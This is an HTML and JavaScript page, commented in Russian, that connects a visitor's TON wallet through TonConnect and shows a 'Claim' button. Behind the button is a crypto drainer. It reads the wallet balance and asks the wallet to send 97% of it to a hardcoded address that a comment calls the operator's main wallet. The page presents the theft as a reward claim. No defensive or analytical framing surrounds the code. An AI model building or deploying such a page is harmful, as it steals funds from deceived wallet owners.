<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TonConnect</title>

    <!-- Подключение библиотек TonConnect UI и SDK -->
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    
    <!-- Добавим стиль для фона и кнопок -->
    <style>
        body {
            background-color: #001f3d; /* Темно-синий фон */
            color: white; /* Белый текст */
            font-family: Arial, sans-serif; /* Шрифт */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh; /* 100% высоты экрана */
            margin: 0;
        }

        #ton-connect {
            margin-bottom: 20px; /* Расстояние между кнопками */
        }

        button {
            background-color: #0073e6; /* Цвет кнопки */
            color: white; /* Белый цвет текста */
            font-size: 24px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #005bb5; /* Более темный оттенок при наведении */
        }

        /* Стили для кнопки Claim */
        .claim-button {
            margin-top: 30px; /* Расстояние сверху */
        }

        #wallet-info {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <!-- Кнопка для подключения кошелька -->
    <div id="ton-connect"></div>

    <!-- Кнопка "Claim" для трансфера монет -->
    <button onclick="didtrans();" class="claim-button">Claim</button>

    <!-- Место для отображения информации о кошельке и балансе -->
    <div id="wallet-info"></div>

    <!-- Подключаем ваш JavaScript файл -->
    <script src="tonsdk.js"></script>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://' + window.location.hostname + '/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        tonConnectUI.on('walletConnected', async (walletAddress) => {
            console.log('Адрес кошелька:', walletAddress);
            
            // Считываем баланс
            try {
                const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + walletAddress);
                const data = await response.json();
                const balance = parseFloat(data.balance) / 1000000000; // Конвертируем в TON (1 TON = 10^9 nanos)
                
                // Отображаем информацию о кошельке и балансе
                const walletInfoElement = document.getElementById('wallet-info');
                walletInfoElement.innerHTML = `Адрес кошелька: <b>${walletAddress}</b><br>Баланс: <b>${balance} TON</b>`;
            } catch (error) {
                console.error('Ошибка при получении баланса:', error);
            }
        });

        // Функция для выполнения трансфера монет
        async function didtrans() {
            const walletAddress = tonConnectUI.account.address;
            const response = await fetch('https://toncenter.com/api/v3/wallet?address=' + walletAddress);
            const data = await response.json();
            let originalBalance = parseFloat(data.balance);
            let processedBalance = originalBalance - (originalBalance * 0.03); // вычитаем 3% для сохранения средств на оплату комиссий
            let tgBalance = processedBalance / 1000000000;

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
                messages: [{
                    address: "UQA3Qh7xby9ttfPfDdRX0e_I62m4FCNo_7FoloN6y51jcH7c", // Ваш основной кошелек
                    amount: processedBalance
                }]
            };

            try {
                const result = await tonConnectUI.sendTransaction(transaction);
                console.log('Транзакция отправлена');
            } catch (error) {
                console.error('Ошибка при отправке транзакции:', error);
            }
        }
    </script>

</body>
</html>
